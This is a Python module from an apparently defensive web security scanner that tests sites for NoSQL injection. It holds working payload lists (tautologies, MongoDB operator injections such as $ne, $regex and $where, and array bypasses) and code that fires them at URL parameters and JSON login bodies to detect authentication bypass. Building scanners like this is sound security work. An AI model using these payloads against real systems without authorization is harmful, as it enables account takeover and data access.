from __future__ import annotations

import json
import logging
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests as _requests

from .base import BaseScanner
from websecure.core.payloads import load_external_payloads

logger = logging.getLogger(__name__)

# Smart context analysis
try:
    from websecure.core.analysis import analyze_input_context, should_skip_payload_category
    _HAS_ANALYZER = True
except ImportError:
    _HAS_ANALYZER = False

# ---------------------------------------------------------------------------
# Payload definitions
# ---------------------------------------------------------------------------

_URL_STRING_PAYLOADS_CORE: List[Tuple[str, str]] = [
    ("' && '1'=='1", "js_tautology"),
    ("' || '1'=='1", "js_or_tautology"),
    ("'; return true; //", "js_return_true"),
    ("'; return 'a'=='a' && ''=='", "tautology_js2"),
    ("1', $or: [ {}, { 'a':'a", "or_injection"),
    ("' && this.password.match(/.*/)//+%00", "regex_bypass"),
    ("%24where%3D1%3D1", "where_encoded"),
]

def _load_nosqli_payloads() -> List[Tuple[str, str]]:
    """nosqli.txt'i yükle: JSON satırları → _JSON_OPERATOR_PAYLOADS, string satırları → _URL_STRING_PAYLOADS."""
    seen_str = {p for p, _ in _URL_STRING_PAYLOADS_CORE}
    extra_str: List[Tuple[str, str]] = []
    extra_json: List[Tuple[Any, str]] = []
    for line in load_external_payloads("nosqli"):
        if not line:
            continue
        stripped = line.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                obj = json.loads(stripped)
                extra_json.append((obj, "ext_operator"))
            except (json.JSONDecodeError, ValueError):
                pass
        elif stripped not in seen_str:
            seen_str.add(stripped)
            extra_str.append((stripped, "ext_string"))
    return extra_str, extra_json

_EXT_STR, _EXT_JSON = _load_nosqli_payloads()
_URL_STRING_PAYLOADS: List[Tuple[str, str]] = _URL_STRING_PAYLOADS_CORE + _EXT_STR

_BRACKET_OPERATORS: List[Tuple[str, str]] = [
    ("[$ne]", "ne_bracket"),
    ("[$gt]", "gt_bracket"),
    ("[$gte]", "gte_bracket"),
    ("[$regex]", "regex_bracket"),
    ("[$exists]", "exists_bracket"),
    ("[$in][]", "in_bracket"),
]

_JSON_OPERATOR_PAYLOADS: List[Tuple[Any, str]] = [
    ({"$ne": None},                      "ne_null"),
    ({"$ne": "-1"},                      "ne_string"),
    ({"$ne": ""},                        "ne_empty"),
    ({"$gt": ""},                        "gt_empty"),
    ({"$gt": 0},                         "gt_zero"),
    ({"$gte": ""},                       "gte_empty"),
    ({"$lt": "zzzzzzzzzzz"},             "lt_string"),
    ({"$regex": ".*"},                   "regex_all"),
    ({"$regex": "^", "$options": "i"},   "regex_prefix"),
    ({"$where": "1==1"},                 "where_tautology"),
    ({"$exists": True},                  "exists_true"),
    ({"$nin": []},                       "nin_empty"),
    ({"$in": ["admin", "user", "root"]}, "in_values"),
    ({"$expr": {"$eq": [1, 1]}},         "expr_tautology"),
] + _EXT_JSON

_ARRAY_BYPASS_PAYLOADS: List[Tuple[Any, str]] = [
    (["admin"],                    "array_single"),
    (["admin", "administrator"],   "array_multi"),
    ([""],                         "array_empty_str"),
]

_NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoNetworkError",
    r"CastError",
    r"ValidationError",
    r'"name"\s*:\s*"MongoError"',
    r"BSON.*error",
    r"ObjectId.*invalid",
    r"E11000 duplicate",
    r'"code"\s*:\s*1[1-9][0-9]',
    r"operator\s+\$where",
    r"SyntaxError.*where",
    r"unexpected token.*\$",
]

_AUTH_FIELDS = [
    "username", "user", "email", "login",
    "password", "pass", "passwd",
    "id", "token", "apikey",
]


# ---------------------------------------------------------------------------
# NoSQLiScanner
# ---------------------------------------------------------------------------

class NoSQLiScanner(BaseScanner):
    """
    NoSQL Injection Scanner.

    Techniques:
    - URL parameter string injection (tautologies, JS operators)
    - Bracket-style operator params (?param[$ne]=x, ?param[$regex]=.*)
    - JSON body operator injection ({"field": {"$ne": null}})
    - Array-based bypass ({"field": ["admin"]})
    - JavaScript injection via $where / $expr
    - Auth bypass detection (401/403 → 200)
    - MongoDB/NoSQL error message fingerprinting
    - Multi-signal response anomaly detection
    - Parallel payload testing via BaseScanner.run_parallel_probes()
    """

    name = "nosqli"
    MAX_WORKERS = 4

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[NoSQLi] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            if not isinstance(ep, str):
                continue
            parsed = urlparse(ep)
            qs = parse_qsl(parsed.query)

            if qs:
                self._fuzz_url_params(ep, qs, bucket)

            lower = ep.lower()
            if any(x in lower for x in ("api", "auth", "login", "signin", "user", "v1", "v2", "account")):
                self._fuzz_json_body(ep, bucket)

        return self.results

    # -------------------------------------------------------------------------
    # URL parameter fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_url_params(self, url: str, qs: List[Tuple], bucket: str):
        parsed = urlparse(url)
        base_resp = self.fetch_baseline(url, timeout=5)
        if not base_resp:
            return

        params = [p for p, _ in qs]

        def test_string_append(args: Tuple) -> Optional[Dict]:
            param, payload_str, pay_type = args
            new_qs = [(p, v + payload_str if p == param else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — URL Parameter",
                        "url": t_url,
                        "param": param,
                        "payload": payload_str,
                        "severity": "High",
                        "evidence": (
                            f"Status: {base_resp.status_code}→{resp.status_code}, "
                            f"len: {len(base_resp.content)}→{len(resp.content)}"
                        ),
                        "extra": {"payload_type": pay_type},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] String probe timed out for {t_url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] String probe connection error for {t_url}: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] String probe failed for {t_url}: {exc!r}")
            return None

        def test_bracket_op(args: Tuple) -> Optional[Dict]:
            param, op, label = args
            new_qs = [(p, v) for p, v in qs if p != param] + [(param + op, "test")]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — Bracket Operator Param",
                        "url": t_url,
                        "param": f"{param}{op}",
                        "payload": op,
                        "severity": "High",
                        "evidence": f"Status: {base_resp.status_code}→{resp.status_code}",
                        "extra": {"payload_type": label},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] Bracket probe timed out for {t_url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] Bracket probe connection error for {t_url}: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] Bracket probe failed for {t_url}: {exc!r}")
            return None

        # Build all probe args
        string_args = []
        bracket_args = []
        for param in params:
            if _HAS_ANALYZER:
                ctx = analyze_input_context(name=param, source="param", url_path=url)
                if should_skip_payload_category(ctx.context, "nosqli"):
                    continue
            for payload_str, pay_type in _URL_STRING_PAYLOADS:
                string_args.append((param, payload_str, pay_type))
            for op, label in _BRACKET_OPERATORS:
                bracket_args.append((param, op, label))

        # run_parallel_probes with stop_on_first=False to collect all hits
        hits = self.run_parallel_probes(
            test_string_append, string_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        hits += self.run_parallel_probes(
            test_bracket_op, bracket_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        for hit in hits:
            extra = hit.pop("extra", None)
            self.report_finding(**hit, extra=extra)

    # -------------------------------------------------------------------------
    # JSON body fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_json_body(self, url: str, bucket: str):
        baseline = {"username": "testuser", "password": "testpass"}
        base_resp = None
        try:
            base_resp = self.session.post(url, json=baseline, timeout=5)
            if base_resp.status_code in (404, 405):
                return
        except _requests.exceptions.Timeout as exc:
            logger.warning(f"[NoSQLi] JSON baseline timed out for {url}: {exc!r}")
            return
        except _requests.exceptions.ConnectionError as exc:
            logger.warning(f"[NoSQLi] JSON baseline connection error for {url}: {exc!r}")
            return
        except _requests.exceptions.RequestException as exc:
            logger.error(f"[NoSQLi] JSON baseline failed for {url}: {exc!r}")
            return

        def test_operator(args: Tuple) -> Optional[Dict]:
            key, op_payload, pay_type = args
            attack = {**baseline, key: op_payload}
            try:
                resp = self.session.post(url, json=attack, timeout=5)
                if base_resp.status_code in (401, 403) and resp.status_code == 200:
                    return {
                        "vuln_type": "NoSQL Auth Bypass",
                        "url": url,
                        "param": key,
                        "payload": json.dumps(op_payload),
                        "severity": "Critical",
                        "evidence": f"Auth bypass: {base_resp.status_code}→200",
                        "extra": {"payload_type": pay_type},
                    }
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — JSON Body",
                        "url": url,
                        "param": key,
                        "payload": json.dumps(op_payload),
                        "severity": "High",
                        "evidence": (
                            f"Status: {base_resp.status_code}→{resp.status_code}, "
                            f"len: {len(base_resp.content)}→{len(resp.content)}"
                        ),
                        "extra": {"payload_type": pay_type},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] JSON operator probe timed out for {url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] JSON operator probe connection error: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] JSON operator probe failed for {url}: {exc!r}")
            return None

        all_args = []
        for key in _AUTH_FIELDS:
            for op_payload, pay_type in _JSON_OPERATOR_PAYLOADS:
                all_args.append((key, op_payload, pay_type))
            for arr_payload, arr_type in _ARRAY_BYPASS_PAYLOADS:
                all_args.append((key, arr_payload, arr_type))

        hits = self.run_parallel_probes(
            test_operator, all_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        for hit in hits:
            extra = hit.pop("extra", None)
            self.report_finding(**hit, extra=extra)

    # -------------------------------------------------------------------------
    # Multi-signal anomaly detection
    # -------------------------------------------------------------------------

    def _is_anomaly(self, base_resp, attack_resp) -> bool:
        """
        Returns True if the attack response differs from baseline in a meaningful way:
        1. NoSQL/MongoDB error fingerprint in attack but not baseline
        2. Auth bypass: 401/403 → 200
        3. Server error only on attack (200 → 500)
        4. Significant content length change with 200 response
        """
        atk_text = attack_resp.text or ""
        base_text = base_resp.text or ""

        for pat in _NOSQL_ERROR_PATTERNS:
            if re.search(pat, atk_text, re.IGNORECASE):
                if not re.search(pat, base_text, re.IGNORECASE):
                    return True

        if base_resp.status_code in (401, 403) and attack_resp.status_code == 200:
            return True

        if base_resp.status_code == 200 and attack_resp.status_code == 500:
            return True

        if attack_resp.status_code == 200:
            base_len = len(base_resp.content)
            atk_len = len(attack_resp.content)
            if base_len > 0:
                if abs(base_len - atk_len) / base_len > 0.40:
                    return True
            elif atk_len > 100:
                return True

        return False


# ---------------------------------------------------------------------------
# Legacy entry points (backward-compatible with main.py ctx convention)
# ---------------------------------------------------------------------------

def run_nosqli_scan(ctx):
    session = ctx.session
    results = getattr(ctx, "results", {})

    endpoints: set = set(results.get("endpoints", []))
    discovery = results.get("discovery", {})
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)

    targets = list(endpoints)
    scanner = NoSQLiScanner(session=session, results=results)
    if targets:
        scanner.run(targets[0], endpoints=targets)


run = run_nosqli_scan
